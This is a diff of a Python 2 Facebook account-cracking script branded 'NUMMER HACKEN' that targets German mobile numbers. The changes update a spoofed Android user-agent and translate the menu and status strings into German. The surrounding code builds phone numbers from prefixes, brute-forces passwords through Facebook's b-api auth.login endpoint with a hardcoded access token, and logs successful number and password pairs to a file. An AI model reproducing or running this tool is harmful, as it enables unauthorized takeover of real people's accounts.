@@ -26,7 +26,7 @@ sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/92.72.2.210;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
 
 def exb():
     print '[!] Exit'
@@ -65,7 +65,7 @@ logo ="""
 \033[1;94m:INSTAGRAM / 5h4ka
 \033[1;94m  NUMMER HACKEN
 \033[1;92m COLOGNE
-\033[1;92mCreate By : 5H4KA         
+\033[1;92mCreaTeD By : 5H4KA         
     """
 back = 0
 successful = []
@@ -77,7 +77,8 @@ def menu():
     os.system('clear')
     print logo
     print 42 * '\x1b[1;91m='
-    print '\x1b[1;94m[1]\x1b[1;92m GERMAN CRACK NUMMER '
+    print '\x1b[1;94m[1]\x1b[1;92m DEUTSCH NUMMER HACKEN'
+    print '\x2b[1;94m[1]\x1b[1;92m PRIVAET SHAKA'
     print 42 * '\x1b[1;91m='
     action()
 
@@ -92,16 +93,16 @@ def action():
     elif bch == '1':
         os.system('clear')
         print logo
-        print '\x1b[1;92m0152, 0172, 0173, 0157,0163,0162,0176,0151'
+        print '\x1b[1;92m0152, 0172, 0173, 0157 ,151'
         try:
-            c = raw_input(' german CoDE  : ')
+            c = raw_input('DeuTsCH NuMMeR  : ')
             k = ''
             idlist = '.txt'
             for line in open(idlist, 'r').readlines():
                 id.append(line.strip())
 
         except IOError:
-            print '[!] File Not Found'
+            print '[!] File NichT GeFunDeN'
             raw_input('\n[ Back ]')
             menu()
     elif bch == '0':
@@ -112,9 +113,9 @@ def action():
     xxx = str(len(id))
     psb('[\xe2\x9c\x93] CHOOSE CODE: ' + xxx)
     time.sleep(0.1)
-    psb('\x1b[1;91m[\xe2\x9c\x93]\x1b[1;94m warte bruder')
+    psb('\x1b[1;91m[\xe2\x9c\x93]\x1b[1;94m HackinG GestarteT')
     time.sleep(0.1)
-    psb('[!] To Stop CRACK CTRL+Z')
+    psb('[!] Für StoP CTRL+Z')
     time.sleep(0.5)
     print 42 * '\x1b[1;91m='
 
@@ -130,7 +131,7 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[VERY XOSH]\x1b[1;92m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
+                print '\x1b[1;92m[SehR GuT]\x1b[1;92m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
                 okb = open('save/successfull.txt', 'a')
                 okb.write(k + c + user + '>>>' + pass1 + '\n')
                 okb.close()
